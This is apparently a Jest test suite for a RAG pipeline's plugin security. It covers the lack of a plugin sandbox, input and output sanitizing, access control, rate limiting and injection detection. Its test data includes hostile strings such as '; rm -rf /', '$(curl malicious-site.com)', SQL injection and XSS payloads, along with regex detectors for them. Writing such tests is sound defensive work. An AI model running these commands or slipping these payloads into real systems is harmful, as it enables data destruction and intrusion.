// Configure test timeout for security tests
jest.setTimeout(30000);
/**
 * Security Testing Suite for Plugin Isolation
 * Tests plugin security, data sanitization, and access controls
 */

const fs = require("fs");
const os = require("os");
const path = require("path");
// Jest is available globally in CommonJS mode;
const { createRagPipeline } = require("../../src/index.js");
const {
  ErrorSimulator,
  ValidationHelper,
} = require("../utils/test-helpers.js");

describe("Plugin Security and Isolation", () => {
  afterEach(() => {
    jest.clearAllMocks();
  });
  // There is no plugin sandbox: plugins run in-process with the host's
  // permissions (docs-site/docs/Security.md, "Plugin trust"). This checks
  // that behaviour through the pipeline, so a claim that plugins are
  // isolated has to change a real test first.
  describe("plugins run in-process, with no sandbox", () => {
    it("an llm plugin run by the pipeline can read files and set globals", async () => {
      const secretFile = path.join(
        os.tmpdir(),
        `plugin-isolation-${process.pid}.txt`,
      );
      fs.writeFileSync(secretFile, "host file contents");
      try {
        const llm = {
          async generate() {
            global.__pluginWasHere = true;
            return require("fs").readFileSync(secretFile, "utf8");
          },
        };
        const pipeline = createRagPipeline({
          retriever: { retrieve: async () => [{ id: "d", content: "doc" }] },
          llm,
        });
        const result = await pipeline.run({ query: "q", queryVector: [1] });
        expect(result.answer).toBe("host file contents");
        expect(global.__pluginWasHere).toBe(true);
      } finally {
        delete global.__pluginWasHere;
        fs.rmSync(secretFile, { force: true });
      }
    });
  });

  describe("data sanitization", () => {
    it("should sanitize user input", async () => {
      const sanitizer = {
        sanitizeInput(input) {
          if (typeof input !== "string") {
            throw new Error("Input must be a string");
          }

          // Remove potential script injections
          const sanitized = input
            .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "")
            .replace(/javascript:/gi, "")
            .replace(/on\w+\s*=/gi, "")
            .replace(/eval\s*\(/gi, "")
            .replace(/Function\s*\(/gi, "");

          return sanitized;
        },

        validateInput(input) {
          const maxLength = 10000;
          const allowedChars =
            /^[a-zA-Z0-9\s.,?!;:\-_'"()[\]{}@#$%^&*+=|\\/<>~`]*$/;

          if (input.length > maxLength) {
            throw new Error("Input exceeds maximum length");
          }

          if (!allowedChars.test(input)) {
            throw new Error("Input contains invalid characters");
          }

          return true;
        },
      };

      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        "onclick=\"alert('XSS')\"",
        'eval("malicious code")',
        'Function("return process")().exit()',
        "\x00\x01\x02\x03", // Control characters
        "A".repeat(20000), // Excessive length
      ];

      for (const maliciousInput of maliciousInputs) {
        try {
          const sanitized = sanitizer.sanitizeInput(maliciousInput);
          expect(sanitized).not.toContain("<script>");
          expect(sanitized).not.toContain("javascript:");
          expect(sanitized).not.toContain("eval(");

          // Validation should catch remaining issues
          if (sanitized.length > 0) {
            sanitizer.validateInput(sanitized);
          }
        } catch (error) {
          // Expected for invalid inputs
          expect(error.message).toMatch(
            /(exceeds maximum length|invalid characters)/,
          );
        }
      }
    });

    it("should sanitize plugin outputs", async () => {
      const outputSanitizer = {
        sanitizeOutput(output) {
          if (typeof output !== "object" || !output) {
            return { error: "Invalid output format" };
          }

          const sanitized = { ...output };

          // Remove sensitive fields
          delete sanitized.apiKey;
          delete sanitized.password;
          delete sanitized.token;
          delete sanitized.secret;

          // Sanitize text content
          if (sanitized.text) {
            sanitized.text = outputSanitizer.sanitizeText(sanitized.text);
          }

          return sanitized;
        },

        sanitizeText(text) {
          return text
            .replace(/sk-[a-zA-Z0-9]+/g, "[REDACTED]")
            .replace(
              /\b(?:api[_-]?key|password|token|secret)\s*[:=]\s*\S+/gi,
              "[REDACTED]",
            )
            .replace(
              /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
              "[EMAIL_REDACTED]",
            )
            .replace(/\b\d{4}\s?\d{4}\s?\d{4}\s?\d{4}\b/g, "[CARD_REDACTED]");
        },
      };

      const unsafeOutputs = [
        {
          text: "Your API key is: sk-abc123def456",
          apiKey: "sk-abc123def456",
          usage: { tokens: 100 },
        },
        {
          text: "Contact us at support@company.com for help",
          password: "secret123",
        },
        {
          text: "Credit card: 1234 5678 9012 3456",
          token: "bearer-token-123",
        },
      ];

      for (const unsafeOutput of unsafeOutputs) {
        const sanitized = outputSanitizer.sanitizeOutput(unsafeOutput);

        expect(sanitized.apiKey).toBeUndefined();
        expect(sanitized.password).toBeUndefined();
        expect(sanitized.token).toBeUndefined();

        // Check that sensitive data was redacted
        if (unsafeOutput.text.includes("sk-abc123def456")) {
          expect(sanitized.text).toContain("[REDACTED]");
        }
        if (unsafeOutput.text.includes("support@company.com")) {
          expect(sanitized.text).toContain("[EMAIL_REDACTED]");
        }
        if (unsafeOutput.text.includes("1234 5678 9012 3456")) {
          expect(sanitized.text).toContain("[CARD_REDACTED]");
        }

        // Ensure the original sensitive data is removed
        expect(sanitized.text).not.toContain("sk-abc123def456");
        expect(sanitized.text).not.toContain("support@company.com");
        expect(sanitized.text).not.toContain("1234 5678 9012 3456");
      }
    });

    it("should validate plugin contracts for security", async () => {
      const securityValidator = {
        validatePlugin(plugin, type) {
          const errors = [];

          // Check required methods exist
          const requiredMethods = this.getRequiredMethods(type);
          for (const method of requiredMethods) {
            if (typeof plugin[method] !== "function") {
              errors.push(`Missing required method: ${method}`);
            }
          }

          // Check for suspicious methods
          const suspiciousMethods = ["eval", "Function", "require", "import"];
          for (const method of suspiciousMethods) {
            if (typeof plugin[method] === "function") {
              errors.push(`Suspicious method detected: ${method}`);
            }
          }

          // Check plugin metadata
          if (!plugin.metadata || typeof plugin.metadata !== "object") {
            errors.push("Plugin must provide metadata object");
          } else {
            if (!plugin.metadata.name || !plugin.metadata.version) {
              errors.push("Plugin metadata must include name and version");
            }
          }

          return errors;
        },

        getRequiredMethods(type) {
          const methodMap = {
            llm: ["generate"],
            retriever: ["store", "retrieve"],
            reranker: ["rerank"],
            embedder: ["embed"],
          };
          return methodMap[type] || [];
        },
      };

      const validPlugin = {
        async generate(prompt, options = {}) {
          return { text: "Valid response" };
        },
        metadata: {
          name: "valid-plugin",
          version: "1.0.0",
        },
      };

      const invalidPlugin = {
        async generate(prompt, options = {}) {
          return eval('({ text: "Dangerous response" })');
        },
        eval: function (code) {
          return eval(code);
        },
        // Missing metadata
      };

      const validErrors = securityValidator.validatePlugin(validPlugin, "llm");
      const invalidErrors = securityValidator.validatePlugin(
        invalidPlugin,
        "llm",
      );

      expect(validErrors).toHaveLength(0);
      expect(invalidErrors.length).toBeGreaterThan(0);
      expect(invalidErrors.some((e) => e.includes("Suspicious method"))).toBe(
        true,
      );
      expect(invalidErrors.some((e) => e.includes("metadata"))).toBe(true);
    });
  });

  describe("access control", () => {
    it("should enforce role-based access control", async () => {
      const accessController = {
        roles: {
          admin: ["read", "write", "delete", "configure"],
          user: ["read", "write"],
          guest: ["read"],
        },

        checkPermission(userRole, action) {
          const permissions = this.roles[userRole] || [];
          return permissions.includes(action);
        },

        enforceAccess(userRole, action) {
          if (!this.checkPermission(userRole, action)) {
            throw new Error(
              `Access denied: ${userRole} cannot perform ${action}`,
            );
          }
        },
      };

      const testCases = [
        { role: "admin", action: "configure", shouldPass: true },
        { role: "user", action: "write", shouldPass: true },
        { role: "guest", action: "read", shouldPass: true },
        { role: "guest", action: "write", shouldPass: false },
        { role: "user", action: "delete", shouldPass: false },
        { role: "invalid", action: "read", shouldPass: false },
      ];

      for (const testCase of testCases) {
        if (testCase.shouldPass) {
          expect(() => {
            accessController.enforceAccess(testCase.role, testCase.action);
          }).not.toThrow();
        } else {
          expect(() => {
            accessController.enforceAccess(testCase.role, testCase.action);
          }).toThrow("Access denied");
        }
      }
    });

    it("should implement rate limiting", async () => {
      jest.useRealTimers(); // Use real timers for this timing-sensitive test

      const rateLimiter = {
        requests: new Map(),

        isAllowed(userId, limit = 10, windowMs = 60000) {
          const now = Date.now();
          const userRequests = this.requests.get(userId) || [];

          // Remove old requests outside the window
          const validRequests = userRequests.filter(
            (timestamp) => now - timestamp < windowMs,
          );

          if (validRequests.length >= limit) {
            return false;
          }

          validRequests.push(now);
          this.requests.set(userId, validRequests);
          return true;
        },

        getRemainingRequests(userId, limit = 10, windowMs = 60000) {
          const now = Date.now();
          const userRequests = this.requests.get(userId) || [];
          const validRequests = userRequests.filter(
            (timestamp) => now - timestamp < windowMs,
          );

          return Math.max(0, limit - validRequests.length);
        },
      };

      const userId = "test-user";
      const limit = 5;
      const windowMs = 100; // Shorter window for faster test

      // Should allow requests up to limit
      for (let i = 0; i < limit; i++) {
        expect(rateLimiter.isAllowed(userId, limit, windowMs)).toBe(true);
      }

      // Should deny additional requests
      expect(rateLimiter.isAllowed(userId, limit, windowMs)).toBe(false);
      expect(rateLimiter.getRemainingRequests(userId, limit, windowMs)).toBe(0);

      // Should allow requests after window expires
      await new Promise((resolve) => setTimeout(resolve, windowMs + 50));
      expect(rateLimiter.isAllowed(userId, limit, windowMs)).toBe(true);
    });

    it("should audit security events", async () => {
      const securityAuditor = {
        events: [],

        logEvent(type, details) {
          this.events.push({
            type,
            details,
            timestamp: new Date().toISOString(),
            id: Math.random().toString(36).substr(2, 9),
          });
        },

        getEvents(type = null, since = null) {
          let filtered = this.events;

          if (type) {
            filtered = filtered.filter((event) => event.type === type);
          }

          if (since) {
            filtered = filtered.filter(
              (event) => new Date(event.timestamp) >= since,
            );
          }

          return filtered;
        },

        detectAnomalies() {
          const recentEvents = this.getEvents(
            null,
            new Date(Date.now() - 300000),
          ); // 5 minutes
          const failureEvents = recentEvents.filter(
            (e) => e.type === "auth_failure",
          );

          return {
            suspiciousActivity: failureEvents.length > 5,
            failureCount: failureEvents.length,
            recentEventCount: recentEvents.length,
          };
        },
      };

      // Simulate security events
      securityAuditor.logEvent("auth_success", {
        userId: "user1",
        ip: "192.168.1.1",
      });
      securityAuditor.logEvent("auth_failure", {
        userId: "user2",
        ip: "192.168.1.2",
      });
      securityAuditor.logEvent("plugin_load", {
        pluginName: "test-plugin",
        version: "1.0.0",
      });

      // Simulate multiple failures
      for (let i = 0; i < 6; i++) {
        securityAuditor.logEvent("auth_failure", {
          userId: "attacker",
          ip: "10.0.0.1",
        });
      }

      const allEvents = securityAuditor.getEvents();
      const authFailures = securityAuditor.getEvents("auth_failure");
      const anomalies = securityAuditor.detectAnomalies();

      expect(allEvents.length).toBe(9);
      expect(authFailures.length).toBe(7);
      expect(anomalies.suspiciousActivity).toBe(true);
      expect(anomalies.failureCount).toBe(7);
    });
  });

  describe("vulnerability testing", () => {
    it("should prevent injection attacks", async () => {
      const injectionTester = {
        testSQLInjection(input) {
          const sqlPatterns = [
            // Only match clear SQL injection patterns
            /'\s*(or|and)\s*'?1'?\s*=\s*'?1/i, // Classic injection like ' OR 1=1
            /'\s*;\s*(drop|delete|insert|update)\s+/i, // Statements after quotes
            /--\s*\w/i, // SQL comments with content
            /\/\*[\s\S]*\*\//i, // SQL block comments with content
            // SQL keywords only when followed by clear SQL syntax
            /\b(union|select)\s+(all\s+)?select\s+/i,
            /\b(drop|delete)\s+table\s+/i,
          ];

          return sqlPatterns.some((pattern) => pattern.test(input));
        },

        testCommandInjection(input) {
          const commandPatterns = [
            // Be more specific about command injection patterns
            /[;&|`]\s*\w/, // Command separators followed by text
            /\$\([^)]*\)/, // Command substitution
            /\b(rm|del|format|shutdown|reboot)\s+/i, // Dangerous commands followed by space
          ];

          return commandPatterns.some((pattern) => pattern.test(input));
        },

        testScriptInjection(input) {
          const scriptPatterns = [
            /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
            /javascript:/i,
            /on\w+\s*=/i,
          ];

          return scriptPatterns.some((pattern) => pattern.test(input));
        },
      };

      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM passwords--",
        "; rm -rf /",
        "$(curl malicious-site.com)",
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "onclick=\"alert('XSS')\"",
      ];

      for (const input of maliciousInputs) {
        const hasSQLInjection = injectionTester.testSQLInjection(input);
        const hasCommandInjection = injectionTester.testCommandInjection(input);
        const hasScriptInjection = injectionTester.testScriptInjection(input);

        const isVulnerable =
          hasSQLInjection || hasCommandInjection || hasScriptInjection;
        expect(isVulnerable).toBe(true); // Should detect the malicious input
      }

      // Test safe inputs
      const safeInputs = [
        "What is machine learning?",
        "Explain neural networks",
        "How does AI work?",
      ];

      for (const input of safeInputs) {
        const hasSQLInjection = injectionTester.testSQLInjection(input);
        const hasCommandInjection = injectionTester.testCommandInjection(input);
        const hasScriptInjection = injectionTester.testScriptInjection(input);

        const isVulnerable =
          hasSQLInjection || hasCommandInjection || hasScriptInjection;
        expect(isVulnerable).toBe(false); // Should not flag safe inputs
      }
    });

    it("should handle denial of service attempts", async () => {
      const dosProtection = {
        requestCounts: new Map(),

        checkDOS(clientId, threshold = 100, windowMs = 60000) {
          const now = Date.now();
          const clientData = this.requestCounts.get(clientId) || {
            count: 0,
            windowStart: now,
          };

          // Reset window if expired
          if (now - clientData.windowStart > windowMs) {
            clientData.count = 0;
            clientData.windowStart = now;
          }

          clientData.count++;
          this.requestCounts.set(clientId, clientData);

          return clientData.count > threshold;
        },

        simulateLoad(clientId, requestCount) {
          const results = [];
          for (let i = 0; i < requestCount; i++) {
            const isDOS = this.checkDOS(clientId);
            results.push(isDOS);
          }
          return results;
        },
      };

      // Test normal usage
      const normalResults = dosProtection.simulateLoad("normal-client", 50);
      expect(normalResults.every((result) => result === false)).toBe(true);

      // Test DOS attack
      const attackResults = dosProtection.simulateLoad("attack-client", 150);
      const dosDetected = attackResults.some((result) => result === true);
      expect(dosDetected).toBe(true);
    });
  });
});
